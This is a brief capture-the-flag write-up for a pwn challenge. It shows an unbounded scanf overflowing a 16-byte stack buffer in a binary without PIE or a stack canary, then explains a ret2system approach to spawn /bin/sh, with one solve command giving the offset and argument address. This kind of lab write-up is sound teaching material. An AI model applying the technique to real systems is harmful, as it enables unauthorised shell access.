# smoll but spooky
> The legend speaks of a ghostly vessel doomed to sail the seas forever, its captain bound by a fate worse than death. Those who dare cross its path must break free before they, too, become part of the crew. The echoes of the past hold the bash. Follow them right, and ye might just escape the cursed grip of the Flying Dutchman.
>
> Author: OS1R1S

Check the proctection using `checksec`. No canary, no PIE with NX enabled which means buffer overflow is highly feasible. 
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
It is a simple main function. It asks for our input and will print back to us. The problem is `scanf` didn't specify any size, so it will take all out input. This will lead to buffer overflow. 

```
undefined8 main(void)

{
  undefined local_18 [16];
  
  system("echo -n \"Is it that spooky?\"");
  __isoc99_scanf(&DAT_004006c5,local_18);
  printf("Welcome to Blackberry CTF 2025, %s!\n",local_18);
  return 0;
}
```

There is no win function, so we need to find other way. There is `/bin/sh` string available and also `system` function. That means we can call `system('/bin/sh')`.

![image](https://github.com/user-attachments/assets/c404cbd8-b34f-4117-a42d-6fae250f7481)

![image](https://github.com/user-attachments/assets/e8a5579d-21db-42b5-85bc-33284e44bd49)


```
python3 solve.py ./smoll-but-spooky --offset 24 --function system --arg 0x601048 
```
## Flag
![image](https://github.com/user-attachments/assets/b63b7890-8c34-4216-ba1a-ca3ebb174ad1)
